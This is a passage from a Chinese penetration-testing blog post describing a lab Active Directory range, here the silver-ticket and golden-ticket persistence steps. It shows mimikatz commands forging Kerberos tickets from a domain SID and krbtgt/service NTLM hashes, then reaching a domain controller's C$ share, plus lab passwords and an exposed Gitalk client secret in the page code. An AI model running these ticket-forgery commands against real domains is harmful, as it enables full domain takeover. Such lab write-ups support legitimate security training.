+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt;cd C:\Users\alice\Desktop\tools\mimikatz_trunk\x64</span><br><span class="line">PS C:\Users\alice\Desktop\tools\mimikatz_trunk\x64&gt;.\mimikatz.exe</span><br><span class="line">mimikatz # kerberos::golden /sid:S-1-5-21-1187620287-4058297830-2395299116-1103 /domain:offensive.local /target:Offensive-SQL1:1433 /service:MSSQLSvc /rc4:fc525c9683e8fe067095ba2ddc971889 /user:idontexist /id:1103 /ptt</span><br><span class="line">mimikatz # misc::cmd</span><br><span class="line">C:\Users\Alice\Desktop\tools\mimikatz_trunk\x64&gt;.\mimikatz.exe</span><br><span class="line">mimikatz # kerberos::list</span><br></pre></td></tr></table></figure>
+
+<h1 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h1><h2 id="Golden-Ticket-Attack"><a href="#Golden-Ticket-Attack" class="headerlink" title="Golden Ticket Attack"></a>Golden Ticket Attack</h2><p>以当前权限访问DC</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c:\&gt;dir \\dc.offensive.local\c$</span><br></pre></td></tr></table></figure>
+
+<p>使用Mimikatz命令<code>kerberos::golden</code>，传递域名SID，域名，krbtgt帐户的NTLM哈希，用户名和组信息以创建Golden Ticket</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt;cd C:\Users\alice\Desktop\tools\mimikatz_trunk\x64</span><br><span class="line">PS C:\Users\alice\Desktop\tools\mimikatz_trunk\x64&gt;.\mimikatz.exe</span><br><span class="line">mimikatz # kerberos::golden /sid:S-1-5-21-1187620287-4058297830-2395299116 /domain:offensive.local /rc4:61d83c569b93bfcd4ca2087011361caa /user:idontexist /id:500</span><br><span class="line">mimikatz # kerberos::ptt ticket.kirbi</span><br><span class="line">mimikatz # misc::cmdmimikatz # kerberos::tickets</span><br></pre></td></tr></table></figure>
+
+<p>使用spawn命令提示符特权访问DC</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c:\&gt;dir \\dc.offensive.local\c$</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>Offensive域环境在我本地快照一直无法恢复，本地测试时因为快照不一致，无法信任域环境，所以没有进行实验，直接转了百度云的那片文档。</p>
+<p>之前有想过把环境搭在公司服务器，但是硬盘只剩下60G，所以也没能成功。从Workerstation迁移到vSphere也踩过不少坑，具体步骤参考 </p>
+<p><a href="https://blog.csdn.net/sinat_21302587/article/details/53581751" target="_blank" rel="noopener">vmware vsphere 打开本地的虚拟机资源,workstation中的虚拟机导入到vsphere - Katios</a></p>
+<p><a href="https://blog.csdn.net/Matrix_Designer/article/details/16828925" target="_blank" rel="noopener">把Workstation的虚机迁移到vSphere - Matrix_Designer的专栏</a></p>
+<p>（光环境我就下了一天，我裂开了。</p>
+<blockquote>
+<p>环境解压密码：bsidessg@2019</p>
+<p>Machine Offensive-DC登陆密码应该是 <code>Administrator:Password@</code>而环境自带的密码是Passw0rd@，当时试了好久都没登陆成功</p>
+</blockquote>
+<p>参考：</p>
+<p>[Powershell 提权框架-Powerup](<a href="https://wooyun.js.org/drops/Powershell" target="_blank" rel="noopener">https://wooyun.js.org/drops/Powershell</a> 提权框架-Powerup.html)</p>
+<p><a href="https://www.anquanke.com/post/id/193431" target="_blank" rel="noopener">从内网到域控（offensive实战）</a></p>
+<p><a href="https://daiker.gitbook.io/" target="_blank" rel="noopener">Active Directory简介</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <div>
+    
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+    
+    </div>
+      <div>
+        
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Wh0ale</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://wh0ale.github.io/2019/12/16/Offensive域环境靶场渗透/" title="Offensive域环境靶场渗透">https://wh0ale.github.io/2019/12/16/Offensive域环境靶场渗透/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+
+    <footer class="post-footer">
+          
+        
+        <div class="post-tags">
+            <a href="/tags/域渗透/" rel="tag"><i class="fa fa-tag"></i># 域渗透</a>
+          
+        </div>
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+              <a href="/2019/12/11/VulnStack域环境靶场渗透/" rel="next" title="VulnStack域环境靶场渗透">
+                <i class="fa fa-chevron-left"></i> VulnStack域环境靶场渗透
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+          </div>
+        </div>
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+    
+    <div class="comments" id="gitalk-container"></div>
+  
+
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/avatar.gif"
+      alt="Wh0ale">
+  <p class="site-author-name" itemprop="name">Wh0ale</p>
+  <div class="site-description motion-element" itemprop="description">No master and rookie，only hardworking and lazy.</div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">125</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+          
+            <a href="/categories/">
+          
+        
+        
+        
+          
+        
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">分类</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">60</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/Wh0ale" title="GitHub &rarr; https://github.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://medium.com/@Wh0ale" title="Medium &rarr; https://medium.com/@Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-medium"></i>Medium</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="/AttackerWh0ale@gmail.com" title="Mail &rarr; AttackerWh0ale@gmail.com"><i class="fa fa-fw fa-envelope"></i>Mail</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://twitter.com/Wh0ale" title="Twitter &rarr; https://twitter.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+    
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    
+  
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+        </div>
+      </div>
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#环境配置"><span class="nav-number">1.</span> <span class="nav-text">环境配置</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#特权提升"><span class="nav-number">2.</span> <span class="nav-text">特权提升</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#域枚举"><span class="nav-number">3.</span> <span class="nav-text">域枚举</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#管理员侦察"><span class="nav-number">4.</span> <span class="nav-text">管理员侦察</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#横向运动"><span class="nav-number">5.</span> <span class="nav-text">横向运动</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#域管理员权限"><span class="nav-number">6.</span> <span class="nav-text">域管理员权限</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Kerberoasting"><span class="nav-number">6.1.</span> <span class="nav-text">Kerberoasting</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Silver-Ticket"><span class="nav-number">6.1.1.</span> <span class="nav-text">Silver Ticket</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#权限维持"><span class="nav-number">7.</span> <span class="nav-text">权限维持</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Golden-Ticket-Attack"><span class="nav-number">7.1.</span> <span class="nav-text">Golden Ticket Attack</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Wh0ale</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="站点总字数">1.5m</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">22:29</span>
+</div>
+
+<div>
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("03/31/2019 00:00:00");
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-user"></i>
+    </span>
+    <span class="site-uv" title="总访客量">
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+    <span class="post-meta-divider">|</span>
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-eye"></i>
+    </span>
+    <span class="site-pv" title="总访问量">
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+  </div>
+
+  
+    
+    
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+  <script src="/lib/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script src="/lib/reading_progress/reading_progress.js"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  <script src="/js/utils.js?v=7.3.0"></script>
+  <script src="/js/motion.js?v=7.3.0"></script>
+
+  
+  <script src="/js/affix.js?v=7.3.0"></script>
+  <script src="/js/schemes/pisces.js?v=7.3.0"></script>
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.3.0"></script>
+<script src="/js/post-details.js?v=7.3.0"></script>
+
+
+
+  <script src="/js/next-boot.js?v=7.3.0"></script>
+
+  
+
+  
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.3.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+<script src="//cdn.jsdelivr.net/npm/js-md5@0.7.3/src/md5.min.js"></script>
+
+<script>
+  var gitalk = new Gitalk({
+    clientID: '925b9aa350afc793e04c',
+    clientSecret: 'bcd92ef416b81450a12e6388b00dfa49f798437a',
+    repo: 'Wh0ale.github.io',
+    owner: 'Wh0ale',
+    admin: ['Wh0ale'],
+    id: md5(location.pathname),
+      language: window.navigator.language || window.navigator.userLanguage,
+    
+    distractionFreeMode: 'true'
+  });
+  gitalk.render('gitalk-container');
+</script>
+
+
+</body>
+</html>
